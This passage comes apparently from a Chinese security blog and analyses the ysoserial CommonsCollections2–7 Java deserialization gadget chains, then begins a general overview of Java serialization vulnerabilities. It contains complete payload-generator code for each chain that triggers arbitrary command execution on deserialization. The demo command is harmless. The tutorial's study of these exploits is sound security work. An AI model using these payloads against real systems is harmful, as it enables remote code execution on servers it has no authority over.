com.sun.org.apache.xalan.internal.xsltc.DOM;\nimport com.sun.org.apache.xalan.internal.xsltc.TransletException;\nimport com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;\nimport com.sun.org.apache.xml.internal.serializer.SerializationHandler;\nimport javassist.ClassClassPath;\nimport javassist.ClassPool;\nimport javassist.CtClass;\nimport org.apache.commons.collections4.comparators.TransformingComparator;\nimport org.apache.commons.collections4.functors.InvokerTransformer;\nimport java.io.*;\nimport java.lang.reflect.Field;\nimport java.util.PriorityQueue;\nimport static sun.reflect.misc.FieldUtil.getField;\npublic class CommonCollection2Payload {\n//    通过javassist动态创建类的时候需要用到这个类\n    public static class StubTransletPayload extends AbstractTranslet implements Serializable {\n        private static final long serialVersionUID = -5971610431559700674L;\n        public void transform (DOM document, SerializationHandler[] handlers ) throws TransletException {}\n        @Override\n        public void transform (DOM document, DTMAxisIterator iterator, SerializationHandler handler ) throws TransletException {}\n    }\n// 设置成员变量值\n    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {\n        Field field = null;\n        try {\n            //获取私有成员变量\n            field = obj.getClass().getDeclaredField(fieldName);\n            //获取私有成员变量访问权限\n            Permit.setAccessible(field);\n        }\n        catch (NoSuchFieldException ex) {\n            if (obj.getClass().getSuperclass() != null)\n                field = getField(obj.getClass().getSuperclass(), fieldName);\n        }\n        field.set(obj, value);\n    }\n//  获取成员变量值得\n    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {\n        Field field = null;\n        try {\n            field = obj.getClass().getDeclaredField(fieldName);\n            Permit.setAccessible(field);\n        }\n        catch (NoSuchFieldException ex) {\n            if (obj.getClass().getSuperclass() != null)\n                field = getField(obj.getClass().getSuperclass(), fieldName);\n        }\n        return field.get(obj);\n    }\n//  7u21反序列化漏洞恶意类生成函数\n    public static Object createTemplatesImpl(String command) throws Exception{\n        Object templates = Class.forName(\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\").newInstance();\n        // use template gadget class\n        ClassPool pool = ClassPool.getDefault();\n        final CtClass clazz = pool.get(StubTransletPayload.class.getName());\n        String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"\" +\n                command.replaceAll(\"\\\\\\\\\",\"\\\\\\\\\\\\\\\\\").replaceAll(\"\\\"\", \"\\\\\\\"\") +\n                \"\\\");\";\n        clazz.makeClassInitializer().insertAfter(cmd);\n        clazz.setName(\"ysoserial.Pwner\" + System.nanoTime());\n        final byte[] classBytes = clazz.toBytecode();\n        setFieldValue(templates, \"_bytecodes\", new byte[][] {\n                classBytes});\n        // required to make TemplatesImpl happy\n        setFieldValue(templates, \"_name\", \"Pwnr\");\n        setFieldValue(templates, \"_tfactory\", Class.forName(\"com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl\").newInstance());\n        return templates;\n    }\n    public static void main(String[] args) throws Exception {\n        String command = \"open /Applications/Calculator.app/\";\n        final Object templates = createTemplatesImpl(command);\n        // payload中再次使用了InvokerTransformer，可见这个在3.2.2版本中被拉黑的类在4.0中反倒又可以用了\n        //这个toString值只是个幌子，后面会通过setFieldValue把iMethodName的值改成newTransformer\n        final InvokerTransformer transformer = new InvokerTransformer(\"toString\", new Class[0], new Object[0]);\n        // payload中的核心代码模块，创建一个PriorityQueue对象，并将它的comparator设为包含恶意transformer对象的TransformingComparator\n        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2,new TransformingComparator(transformer));\n        // 先设置为正常变量值，在后面通过setFieldValue来修改\n        queue.add(1);\n        queue.add(1);\n        // 不再像第一个payload中一样直接去调用调出runtime的exec，而是通过调用TemplatesImpl类的newTransformer方法来实现RCE\n        setFieldValue(transformer, \"iMethodName\", \"newTransformer\");\n        final Object[] queueArray = (Object[]) getFieldValue(queue, \"queue\");\n        queueArray[0] = templates;\n        queueArray[1] = 1;\n        FileOutputStream fos = new FileOutputStream(\"payload.ser\");\n        ObjectOutputStream oos = new ObjectOutputStream(fos);\n        oos.writeObject(queue);\n        oos.flush();\n        oos.close();\n        FileInputStream fis = new FileInputStream(\"payload.ser\");\n        ObjectInputStream ois = new ObjectInputStream(fis);\n        Object newObj = ois.readObject();\n        ois.close();\n    }\n}\n```\n\n这个payload和1在造成RCE的原理上有个不同是不再去依靠Runtime类的exec，而是使用了我们知名的7u21模块，关于7u21模块RCE的讲解，我们也不细谈，网上大把大把的分析，只需要明白一件事情，我们只要能调用包含恶意字节码的TemplatesImpl对象的利用链中的任意函数(getOutputProperties、newTransformer等等)，就能造成RCE。\n\n先去看调用链，\n\n![img5.jpg](/images/a7/5.png)\n\n反序列化时候调用PriorityQueue的readObject方法，并在函数最后调用heapify方法，\n\n![img6.jpg](/images/a7/6.png)\n\nheapify方法会把PriorityQueue的queue变量作为参数去调用siftDown方法\n\n![img7.jpg](/images/a7/7.png)\n\n只要有comparetor就会去调用siftDownUsingComparator方法\n\n![img8.jpg](/images/a7/8.png)\n\n调用comparator的compare方法，这个comparator就是我们传入的tranformer为恶意InvokerTransformer对象的TransformingComparator\n\n![img9.jpg](/images/a7/9.png)\n\n成功调用到恶意tranformer的tranform方法，并把恶意TemplatesImpl作为参数传入，剩下的不在去跟。\n\n![img10.jpg](/images/a7/10.png)\n\n关于4.0的补丁，和3.2.2的时候一模一样，就是把InvokerTransformer给拉黑了。\n\n# CommonsCollections3\n\n**适用版本**：3.1-3.2.1，jdk7u21及以前\n\nCommonsCollections3出现了一个我们在CommonsCollections1中没怎么见到过的InstantiateTransformer，先去看一下这个InstantiateTransformer的transform方法，\n\n```java\n    public Object transform(Object input) {\n        try {\n            if (!(input instanceof Class)) {\n                throw new FunctorException(\"InstantiateTransformer: Input object was not an instanceof Class, it was a \" + (input == null ? \"null object\" : input.getClass().getName()));\n            } else {\n                Constructor con = ((Class)input).getConstructor(this.iParamTypes);\n                return con.newInstance(this.iArgs);\n            }\n        }\n```\n\n简单来说这个transform方法的用处就是**调用input参数的构造函数，并且这个类的两个成员变量就是传给构造函数的参数类型和参数值**。其他的地方就和CommonsCollections1差不多了。\n\n看一下代码，考虑到代码中用到的一些关键函数在前面两个payload里面已经给出了，所以接下来的代码里面我就只给出main函数代码了。\n\n```java\n    public static void main(String[] args) throws Exception {\n        String command = \"open /Applications/Calculator.app/\";\n        Object templatesImpl = createTemplatesImpl(command);\n        final Transformer transformerChain = new ChainedTransformer(\n                new Transformer[]{ new ConstantTransformer(1) });\n        final Transformer[] transformers = new Transformer[] {\n                new ConstantTransformer(TrAXFilter.class),\n                new InstantiateTransformer(\n                        new Class[] { Templates.class },\n                        new Object[] { templatesImpl } )};\n        final Map innerMap = new HashMap();\n        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);\n        Map mapProxy = (Map) createMyproxy(getInvocationHandler(ANN_INV_HANDLER_CLASS, lazyMap), Map.class);\n        InvocationHandler handler = getInvocationHandler(ANN_INV_HANDLER_CLASS, mapProxy);\n        //这样的话，调用transformerChain的tranform方法就相当于调用TrAXFilter(templatesImpl)\n        setFieldValue(transformerChain, \"iTransformers\", transformers);\n        FileOutputStream fos = new FileOutputStream(\"payload.ser\");\n        ObjectOutputStream oos = new ObjectOutputStream(fos);\n        oos.writeObject(handler);\n        oos.flush();\n        oos.close();\n        FileInputStream fis = new FileInputStream(\"payload.ser\");\n        ObjectInputStream ois = new ObjectInputStream(fis);\n        Object newObj = ois.readObject();\n        ois.close();\n    }\n```\n\n看一下调用栈，\n\n![img11.jpg](/images/a7/11.png)\n\n基本所有地方都和CommonsCollections1差不多，唯一的区别就在于循环调用的transformers变成了这个样子\n\n```java\n final Transformer[] transformers = new Transformer[] {\n                new ConstantTransformer(TrAXFilter.class),\n                new InstantiateTransformer(\n                        new Class[] { Templates.class },\n                        new Object[] { templatesImpl } )};\n```\n\nConstantTransformer返回了TrAXFilter的对象给到InstantiateTransformer的tranform方法，最终调用TrAXFilter的构造函数，并把恶意的templatesImpl作为参数给到构造函数，\n\n![img12.jpg](/images/a7/12.png)\n\n看一下TrAXFilter的构造函数会去调用传入的恶意templatesImpl的newTransformer方法，正好符合我们的期望，造成RCE。\n\n看一下3.2.2版本的修复补丁，和CommonsCollections1一样，就是把InstantiateTransformer类给拉黑了。\n\n# CommonsCollections4\n\n**适用版本**：4.0，jdk7u21及以前\n\nCommonsCollections4这个payload认真的说，完全没有任何新的东西，其实就是把CommonsCollections2和CommonsCollections3做了一个杂交。不过从中我们可以窥探到，其实不论是4.0版本还是3.1-3.2.1版本，利用的方法基本都是可以共通的。\n\n看一下代码，\n\n```java\n    public static void main(String[] args) throws Exception {\n        String command = \"open /Applications/Calculator.app/\";\n        Object templates = createTemplatesImpl(command);\n        ConstantTransformer constant = new ConstantTransformer(String.class);\n        Class[] paramTypes = new Class[] { String.class };\n        Object[] str = new Object[] { \"foo\" };\n        InstantiateTransformer instantiate = new InstantiateTransformer(\n                paramTypes, str);\n        paramTypes = (Class[]) getFieldValue(instantiate, \"iParamTypes\");\n        str = (Object[]) getFieldValue(instantiate, \"iArgs\");\n        ChainedTransformer chain = new ChainedTransformer(new Transformer[] { constant, instantiate });\n        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, new TransformingComparator(chain));\n        queue.add(1);\n        queue.add(1);\n        setFieldValue(constant, \"iConstant\", TrAXFilter.class);\n        paramTypes[0] = Templates.class;\n        str[0] = templates;\n        FileOutputStream fos = new FileOutputStream(\"payload.ser\");\n        ObjectOutputStream oos = new ObjectOutputStream(fos);\n        oos.writeObject(queue);\n        oos.flush();\n        oos.close();\n        FileInputStream fis = new FileInputStream(\"payload.ser\");\n        ObjectInputStream ois = new ObjectInputStream(fis);\n        Object newObj = ois.readObject();\n        ois.close();\n    }\n```\n\n看一下调用栈，\n\n![img13.jpg](/images/a7/13.png)\n\n代码在上面都是分析过的，简要的文字分析一下：反序列化的时候调用PriorityQueue的readObject方法，从而调用了TransformingComparator中恶意的ChainedTransformer对象的tranform方法，通过循环调用ChainedTransformer中iTransformer对象的tranform方法，进而调用TrAXFilter的构造方法，从而造成命令执行。\n\n不过关于4.1版本的修复和3.2.2是存在不一样的地方的，3.2.2对于InstantiateTransformer类的处理是拉入黑名单，而4.1版本选择把InstantiateTransformer类的反序列化接口给删除了。\n\n![img14.jpg](/images/a7/14.png)\n\n# CommonsCollections5\n\n**适用版本**：3.1-3.2.1，jdk1.8（1.9没试）\n\nCommonsCollections5和前面几个payload有些不太一样的地方，因为jdk在1.8之后对AnnotationInvocationHandler类做了限制，所以在jdk1.8版本就必须找出能替代AnnotationInvocationHandler的新的可以利用的类，所以BadAttributeValueExpException就被发掘了除了，我们直接根据代码来了解这个类，\n\n```java\npublic static void main(String[] args) throws Exception {\n        String command = \"open /Applications/Calculator.app/\";\n        final String[] execArgs = new String[] { command };\n        final Transformer transformerChain = new ChainedTransformer(\n                new Transformer[]{ new ConstantTransformer(1) });\n        final Transformer[] transformers = new Transformer[] {\n                new ConstantTransformer(Runtime.class),\n                new InvokerTransformer(\"getMethod\", new Class[] {\n                        String.class, Class[].class }, new Object[] {\n                        \"getRuntime\", new Class[0] }),\n                new InvokerTransformer(\"invoke\", new Class[] {\n                        Object.class, Object[].class }, new Object[] {\n                        null, new Object[0] }),\n                new InvokerTransformer(\"exec\",\n                        new Class[] { String.class }, execArgs),\n                new ConstantTransformer(1) };\n        final Map innerMap = new HashMap();\n        //创建factory为恶意ChainedTransformer对象的lazyMap类实例\n        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);\n        //创建map为恶意lazyMap，key为foo的TiedMapEntry类实例\n        TiedMapEntry entry = new TiedMapEntry(lazyMap, \"foo\");\n        //将BadAttributeValueExpException对象的成员变量val赋值为恶意entry\n        BadAttributeValueExpException val = new BadAttributeValueExpException(null);\n        Field valfield = val.getClass().getDeclaredField(\"val\");\n        Permit.setAccessible(valfield);\n        valfield.set(val, entry);\n        setFieldValue(transformerChain, \"iTransformers\", transformers);\n        FileOutputStream fos = new FileOutputStream(\"payload.ser\");\n        ObjectOutputStream oos = new ObjectOutputStream(fos);\n        oos.writeObject(val);\n        oos.flush();\n        oos.close();\n        FileInputStream fis = new FileInputStream(\"payload.ser\");\n        ObjectInputStream ois = new ObjectInputStream(fis);\n        Object newObj = ois.readObject();\n        ois.close();\n    }\n```\n\n这个利用链很简单，\n\n![img15.jpg](/images/a7/15.png)\n\n在BadAttributeValueExpException的readObject中，会调用它的成员变量val（也就是我们传入的恶意TiedMapEntry对象）的toString方法，\n\n![img16.jpg](/images/a7/16.png)\n\n在TiedMapEntry中会调用自身的getKey和getValue方法，\n\n![img17.jpg](/images/a7/17.png)\n\n在getValue方法中会调用成员变量map（也就是我们传入的恶意LazyMap对象）的get方法，\n\n![img18.jpg](/images/a7/18.png)\n\n接下来就和CommonsCollections1是一样的了，不再分析。\n\nCommonsCollections在3.2.2版本的时候同样将BadAttributeValueExpException拉入了黑名单。\n\n# CommonsCollections6\n\n**适用版本**：3.1-3.2.1，jdk1.7,1.8均可成功\n\nCommonsCollections6是一个实用性比较广的payload，和上面五个payload相比，它的利用受jdk版本的影响是最小的，先看代码，\n\n```java\n public static void main(String[] args) throws Exception {\n        String command = \"open /Applications/Calculator.app/\";\n        final String[] execArgs = new String[] { command };\n        final Transformer[] transformers = new Transformer[] {\n                new ConstantTransformer(Runtime.class),\n                new InvokerTransformer(\"getMethod\", new Class[] {\n                        String.class, Class[].class }, new Object[] {\n                        \"getRuntime\", new Class[0] }),\n                new InvokerTransformer(\"invoke\", new Class[] {\n                        Object.class, Object[].class }, new Object[] {\n                        null, new Object[0] }),\n                new InvokerTransformer(\"exec\",\n                        new Class[] { String.class }, execArgs),\n                new ConstantTransformer(1) };\n        Transformer transformerChain = new ChainedTransformer(transformers);\n        final Map innerMap = new HashMap();\n//创建一个factory为恶意ChainedTransformer对象的lazyMap类实例\n        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);\n//创建一个map为恶意lazyMap类实例，key为foo的TiedMapEntry类实例\n        TiedMapEntry entry = new TiedMapEntry(lazyMap, \"foo\");\n        HashSet map = new HashSet(1);\n        map.add(\"foo\");\n        Field f = null;\n        try {\n            f = HashSet.class.getDeclaredField(\"map\");\n        } catch (NoSuchFieldException e) {\n            f = HashSet.class.getDeclaredField(\"backingMap\");\n        }\n//取出HashSet对象的成员变量map\n        Permit.setAccessible(f);\n        HashMap innimpl = (HashMap) f.get(map);\n        Field f2 = null;\n        try {\n            f2 = HashMap.class.getDeclaredField(\"table\");\n        } catch (NoSuchFieldException e) {\n            f2 = HashMap.class.getDeclaredField(\"elementData\");\n        }\n//取出HashMap对象的成员变量table\n        Permit.setAccessible(f2);\n        Object[] array = (Object[]) f2.get(innimpl);\n//取出table里面的第一个Entry\n        Object node = array[0];\n        if(node == null){\n            node = array[1];\n        }\n        Field keyField = null;\n        try{\n            keyField = node.getClass().getDeclaredField(\"key\");\n        }catch(Exception e){\n            keyField = Class.forName(\"java.util.MapEntry\").getDeclaredField(\"key\");\n        }\n//取出Entry对象重的key，并将它赋值为恶意的TiedMapEntry对象\n        Permit.setAccessible(keyField);\n        keyField.set(node, entry);\n        FileOutputStream fos = new FileOutputStream(\"payload.ser\");\n        ObjectOutputStream oos = new ObjectOutputStream(fos);\n        oos.writeObject(map);\n        oos.flush();\n        oos.close();\n        FileInputStream fis = new FileInputStream(\"payload.ser\");\n        ObjectInputStream ois = new ObjectInputStream(fis);\n        Object newObj = ois.readObject();\n        ois.close();\n    }\n```\n\nCommonsCollections6的代码是最可以体现出使用反射机制生成恶意对象的优势的代码，我们看一下上面payload中使用反射机制的代码\n\n```java\n HashSet map = new HashSet(1);\n        map.add(\"foo\");\n        Field f = null;\n        try {\n            f = HashSet.class.getDeclaredField(\"map\");\n        } catch (NoSuchFieldException e) {\n            f = HashSet.class.getDeclaredField(\"backingMap\");\n        }\n//取出HashSet对象的成员变量map\n        Permit.setAccessible(f);\n        HashMap innimpl = (HashMap) f.get(map);\n        Field f2 = null;\n        try {\n            f2 = HashMap.class.getDeclaredField(\"table\");\n        } catch (NoSuchFieldException e) {\n            f2 = HashMap.class.getDeclaredField(\"elementData\");\n        }\n//取出HashMap对象的成员变量table\n        Permit.setAccessible(f2);\n        Object[] array = (Object[]) f2.get(innimpl);\n//取出table里面的第一个Entry\n        Object node = array[0];\n        if(node == null){\n            node = array[1];\n        }\n        Field keyField = null;\n        try{\n            keyField = node.getClass().getDeclaredField(\"key\");\n        }catch(Exception e){\n            keyField = Class.forName(\"java.util.MapEntry\").getDeclaredField(\"key\");\n        }\n//取出Entry对象重的key，并将它赋值为恶意的TiedMapEntry对象\n        Permit.setAccessible(keyField);\n        keyField.set(node, entry);\n```\n\n上面给出的这么一长串代码，其实如果不使用反射机制去生成恶意对象，只需要两行代码\n\n```java\n        HashSet map = new HashSet(1);\n        map.add(entry);\n```\n\n两个代码生成的map对象是一摸一样的对象，但是使用第二种方式，你会发现在反序列化的时候无法造成RCE（第二种同样会造成RCE但是是发生在map.add的时候而不是ois.readObject()的时候），原因就出在了lazyMap类的get函数处，\n\n![img19.jpg](/images/a7/19.png)\n\n触发RCE的关键就在于this.factory.transform(key)，然而想走到这一步，需要一个条件：!this.map.containsKey(key)，翻译一下就是加载的这个key之前未被get函数调用过，并且一旦调用过一次后，就会直接把这个key-value对放进this.map中，下次调用直接走else语句，而不会再去调用this.factory.transform(key)。\n\n这样的话，当我们通过map.add(entry)的方式去生成恶意HashSet对象的时候，看一下add方法的调用栈\n\n![img20.jpg](/images/a7/20.png)\n\nadd方法本身就会调用LazyMap的get方法，这样的话，我们需要造成RCE的map在还没进行反序列化的时候，就已经被put到this.map中去了，到了反序列化企图造成rce的时候，调用 LazyMap的get方法，不会再去走if语句而走到else里面去了，从而无法造成命令执行。\n\n当然这种情况并不是无解的，我们可以将上述两行代码中做一下修改变成这种形式，\n\n```java\n        HashSet map = new HashSet(1);\n        map.add(entry);\n        lazyMap.remove(\"foo\");\n```\n\n就是记得把lazyMap中的this.map记得删除一下就完事了，也很简单~~~\n\n现在我们去看一下使用反射机制生成恶意对象从而在反序列化后造成RCE的调用链，\n\n![img21.jpg](/images/a7/21.png)\n\n调用HashSet的readObject方法进行反序列化，将恶意的TiedMapEntry对象带入put函数，\n\n![img22.jpg](/images/a7/22.png)\n\n在put函数中会把恶意的TiedMapEntry对象放入hash函数中，\n\n![img23.jpg](/images/a7/23.png)\n\n在hash函数中调用了恶意的TiedMapEntry对象的hashCode函数\n\n![img24.jpg](/images/a7/24.png)\n\n在hashCode函数中会调用恶意的TiedMapEntry对象自身的getValue函数\n\n![img25.jpg](/images/a7/25.png)\n\n在getValue函数中调用this.map的get函数\n\n![img26.jpg](/images/a7/26.png)\n\n在get函数中调用恶意TiedMapEntry的恶意factory对象的tranform方法，从而造成rce，这里面可以看到这个时候this.map是空的，所以我们能成功进入到if语句中。\n\n![img27.jpg](/images/a7/27.png)\n\n因为这个payload也是用到了InvokerTransformer类的，所以修复方案和第一个payload是一样的。\n\n# CommonsCollections7\n\n**适用版本**：3.1-3.2.1，jdk1.7,1.8均可成功\n\nCommonsCollections7也是一个适用性比较好的payload，在多种版本jdk中都可以执行成功，它的坑点和CommonsCollections6都有着一定的相似性。可以窥探到当把lazyMap作为key传入到hashset或者hashtable的时候往往都会对lazyMap本身的map参数造成一定影响，而这种影响很容易导致rce的失败。\n\n看一下代码，关键的两步我都在代码里面加上了注释，\n\n```java\n    public static void main(String[] args) throws Exception {\n        String command = \"open /Applications/Calculator.app/\";\n        final String[] execArgs = new String[]{command};\n        final Transformer transformerChain = new ChainedTransformer(new Transformer[]{});\n        final Transformer[] transformers = new Transformer[]{\n                new ConstantTransformer(Runtime.class),\n                new InvokerTransformer(\"getMethod\",\n                        new Class[]{String.class, Class[].class},\n                        new Object[]{\"getRuntime\", new Class[0]}),\n                new InvokerTransformer(\"invoke\",\n                        new Class[]{Object.class, Object[].class},\n                        new Object[]{null, new Object[0]}),\n                new InvokerTransformer(\"exec\",\n                        new Class[]{String.class},\n                        execArgs),\n                new ConstantTransformer(1)};\n        Map innerMap1 = new HashMap();\n        Map innerMap2 = new HashMap();\n        Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);\n        lazyMap1.put(\"yy\", 1);\n        Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);\n        lazyMap2.put(\"zZ\", 1);\n        Hashtable hashtable = new Hashtable();\n        hashtable.put(lazyMap1, 1);\n        //开启调试模式去跟一下hashtable.put(lazyMap2, 2)这个代码执行后的变量变化，会发现会发现lazyMap2的map内多了一个 yy->yy的map\n        hashtable.put(lazyMap2, 2);\n        setFieldValue(transformerChain, \"iTransformers\", transformers);\n        //这一步正是为了删除在hashtable.put(lazyMap2, 2)后lazyMap2中多出的那个yy->yy的map\n        lazyMap2.remove(\"yy\");\n        FileOutputStream fos = new FileOutputStream(\"payload.ser\");\n        ObjectOutputStream oos = new ObjectOutputStream(fos);\n        oos.writeObject(hashtable);\n        oos.flush();\n        oos.close();\n        FileInputStream fis = new FileInputStream(\"payload.ser\");\n        ObjectInputStream ois = new ObjectInputStream(fis);\n        Object newObj = ois.readObject();\n        ois.close();\n    }\n```\n\n这个代码的坑就在于当调用hashtable.put(lazyMap2, 2)的时候会因为put函数的一系列操作把lazyMap2变成了我们不期望的模样，\n\n![img28.jpg](/images/a7/28.png)\n\n可以看到lazyMap中的map多了一个yy->yy，其实一旦出现这种情况我们就知道肯定和lazyMap的get函数有关，打个断点看一下什么情况，\n\n![img29.jpg](/images/a7/29.png)遇到这种情况处理起来也很简单，lazyMap2.remove(“yy”)就完事了。\n\nOK，明白了payload的生成代码，接下来我们就去看一下反序列化时候的利用链，\n\n![img30.jpg](/images/a7/30.png)\n\n在Hashtable的readObject方法中会把每个key-value往table里面丢，\n\n![img31.jpg](/images/a7/31.png)\n\n从往table中丢第二个map的时候，就需要开始让它的key和之前的key进行对比，看看有没有重复以决定是新添加一个map还是覆盖原有的，\n\n![img32.jpg](/images/a7/32.png)\n\n然后经过两个equals函数后自然而然的要去调用对于map的get函数以获取值，以做修改，于是就又来到了我们熟悉额lazyMap的get函数，从而调用tranform方法导致了RCE,\n\n![img33.jpg](/images/a7/33.png)\n\n# 总结\n\n通过对ysoserial中关于CommonsCollection的七个利用方式的分析我们可以对可以利用的恶意类做一个总结：\n\n## 四大Tranformer的tranform方法的作用\n\n> **1.ChainedTransformer：**循环调用成员变量iTransformers数组的中ransformer中的tranform方法。\n>\n> **2.InvokerTransformer：** 通过反射的方法调用传入tranform方法中的inuput对象的方法（方法通过成员变量iMethodName设置，参数通过成员变量iParamTypes设置）\n>\n> **3.ConstantTransformer：**返回成员变量iConstant的值。\n>\n> **4.InstantiateTransformer：**通过反射的方法返回传入参数input的实力。（构造函数的参数通过成员变量iArgs传入，参数类型通过成员变量iParamTypes传入）\n\n## 三大Map的作用\n\n> **1.lazyMap：**通过调用lazyMap的get方法可以触发它的成员变量factory的tranform方法，用来和上一节中的Tranformer配合使用。\n>\n> **2.TiedMapEntry：**通过调用TiedMapEntry的getValue方法实现对他的成员变量map的get方法的调用，用来和lazyMap配合使用。\n>\n> **3.HashMap：**通过调用HashMap的put方法实现对成员变量hashCode方法的调用，用来和TiedMapEntry配合使用（TiedMapEntry的hashCode函数会再去调自身的getValue）。\n\n## 五大反序列化利用基类\n\n> **1.AnnotationInvocationHandler：**反序列化的时候会循环调用成员变量的get方法，用来和lazyMap配合使用。\n>\n> **2.PriorityQueue：**反序列化的时候会调用TransformingComparator中的transformer的tranform方法，用来直接和Tranformer配合使用。\n>\n> **3.BadAttributeValueExpException：**反序列化的时候会去调用成员变量val的toString函数，用来和TiedMapEntry配合使用。（TiedMapEntry的toString函数会再去调自身的getValue）。\n>\n> **4.HashSet：**反序列化的时候会去循环调用自身map中的put方法，用来和HashMap配合使用。\n>\n> **5.Hashtable：**当里面包含2个及以上的map的时候，回去循环调用map的get方法，用来和lazyMap配合使用。\n\n\n\n**参考：**\n\nhttp://blog.nsfocus.net/fastjson-remote-deserialization-program-validation-analysis/\n\nhttp://www.vuln.cn/6295\n\nhttps://www.freebuf.com/articles/web/214096.html\n\n[https://badcode.cc/2018/03/15/Java反序列化之Commons-Collections/](https://badcode.cc/2018/03/15/Java反序列化之Commons-Collections/)\n\n","tags":["反序列化","CommonsCollections","gadget"],"categories":["JAVA安全教程"]},{"title":"JAVA反序列化漏洞总结","url":"/2019/02/15/JAVA反序列化漏洞总结/","content":"本文本人首发自https://www.secpulse.com/archives/95012.html\n\n## 前言\n\n### 什么是序列化和反序列化\n\nJava 提供了一种对象序列化的机制，该机制中，一个对象可以被表示为一个字节序列，该字节序列包括该对象的数据、有关对象的类型的信息和存储在对象中数据的类型。反序列化就是通过序列化后的字段还原成这个对象本身。但标识不被序列化的字段是不会被还原的。\n\n\n\n### 序列化有什么用\n\n1）网站相应的session对象存储在硬盘上，那么保存在session中的内容就必须实现相关的序列化操作。\n\n2）如果使用的java对象要在分布式中使用或者在rmi远程调用的网络中使用的话，那么相关的对象必须实现java序列化接口。\n\n \n\n## Java反序列化类型\n\n我们最常见就是原生的java反序列化类型，其实java中有几种方式可以执行反序列化，本文目的也是对这几种类型的反序列化方法进行归纳和总结。\n\n### 1、 Java原生序列化\n\nJava包中自带的类InputStream和OutputStream，它们之间可以互相转化，使用writeObject序列化，使用readObject反序列化。\n\n```java\nimport java.io.*;\n \npublic class DeserializeDemo\n{\n   public static void main(String [] args)\n   {\n      Employee e = null;\n      try\n      {\n         FileInputStream fileIn = new FileInputStream(\"/tmp/employee.ser\");\n         ObjectInputStream in = new ObjectInputStream(fileIn);\n         e = (Employee) in.readObject();\n         in.close();\n         fileIn.close();\n      }catch(IOException i)\n      {\n         i.printStackTrace();\n         return;\n      }catch(ClassNotFoundException c)\n      {\n         System.out.println(\"Employee class not found\");\n         c.printStackTrace();\n         return;\n      }\n      System.out.println(\"Deserialized Employee...\");\n      System.out.println(\"Name: \" + e.name);\n      System.out.println(\"Address: \" + e.address);\n      System.out.println(\"SSN: \" + e.SSN);\n      System.out.println(\"Number: \" + e.number);\n    }\n}\n```\n\n### 2、 Json反序列化\n\nJson序列化一般会使用jackson包，通过ObjectMapper类来进行一些操作，比如将对象转化为byte数组或者将json串转化为对象。\n\n```java\npublic static <T> String serialize(T t) throws JsonProcessingException {\n        ObjectMapper mapper = new ObjectMapper();\n        String jsonResult = mapper.writerWithDefaultPrettyPrinter()\n                .writeValueAsString(t);\n        return jsonResult;\n    }\n```\n\n### 3、 Fastjson反序列化\n\nFastjson是一个性能很好的Java语言实现的Json解析器和生成器，由来自阿里巴巴的工程师开发。具有极快的性能，超越任何其他的Java Json Parser。Fastjson使用parseObject来进行反序列化。\n\n```java\nimport com.alibaba.fastjson.JSON;    \n  \npublic class Person {  \n    int age;  \n    String name;  \n    public int getAge() {  \n        return age;  \n    }  \n    public void setAge(int age) {  \n        this.age = age;  \n    }  \n    public String getName() {  \n        return name;  \n    }  \n    public void setName(String name) {  \n        this.name = name;  \n    }  \n    public static void main(String[] args) {  \n        String jsonString=\"{\\\"name\\\":\\\"hah\\\",\\\"age\\\":1}\";  \n        Person person = JSON.parseObject(jsonString, Person.class);  \n        System.out.println(1);  \n    }  \n}  \n```\n\n### 4、Protobuf 反序列化\n\nProtocol Buffers 是一种轻便高效的结构化数据存储格式，可以用于结构化数据串行化，或者说序列化。它很适合做数据存储或 RPC 数据交换格式。可用于通讯协议、数据存储等领域的语言无关、平台无关、可扩展的序列化结构数据格式。目前提供了 C++、Java、Python 三种语言的 API。\n\n**proto.proto文件内容**\n\n```java\npackage proto;\n\nmessage TestMsg{\n    optional string id = 1;\n    optional string name = 2;\n}\n```\n\n**序列化**\n\n```java\npublic byte[] build(){\n    Proto.TestMsg.Builder builder = Proto.TestMsg.newBuilder();\n    builder.setId(\"ID的值\");\n    builder.setName(\"Name的值\");\n    Proto.TestMsg msg = builder.build();\n\n    return msg.toByteArray();\n}\n```\n\n**反序列化**\n\n```java\nProto.TestMsg msg = Proto.TestMsg.parseFrom(message.returnByte());\nSystem.out.Println(msg);\n```\n\n \n\n## 各方式反序列化比较\n\n![img](/images/a6/1.png)\n\n \n\n## 各序列化漏洞简介\n\n除了使用protobuf进行反序列化没有出现过漏洞，其他方式的序列化都曾出现过漏洞。下面将简单介绍下漏洞，详细的漏洞和exp构造方法大家可以去网上搜索关键字查看（java几个反序列化漏洞exp构造过程都十分精彩，推荐大家认真阅读下）\n\n### 1、Object Serialize 漏洞\n\nApache Commons Collections中实现了TransformedMap ，该类可以在一个元素被添加/删除/或是被修改时(即key或value：集合中的数据存储形式即是一个索引对应一个值，就像身份证与人的关系那样)，会调用transform方法自动进行特定的修饰变换。\n\n![img](/images/a6/2.png)\n\nTransformedMap.decorate方法，预期是对Map类的数据结构进行转化，该方法有三个参数。\n\n- 第一个参数为待转化的Map对象\n- 第二个参数为Map对象内的key要经过的转化方法（可为单个方法，也可为链，也可为空）\n- 第三个参数为Map对象内的value要经过的转化方法\n\n通过对第三个参数通过构造ChainedTransformer链，通过一系列变化，最终执行系统命令。\n\n### 2、Jackson-databind 漏洞\n\nJackson是一套开源的java序列化与反序列化工具框架，可将java对象序列化为xml和json格式的字符串及提供对应的反序列化过程。由于其解析效率较高，目前是Spring MVC中内置使用的解析方式，该漏洞的触发条件是ObjectMapper反序列化前调用了enableDefaultTyping方法。该方法允许json字符串中指定反序列化java对象的类名，而在使用Object、Map、List等对象时，可诱发反序列化漏洞，导致可执行任意命令。\n\n### 3、FastJson 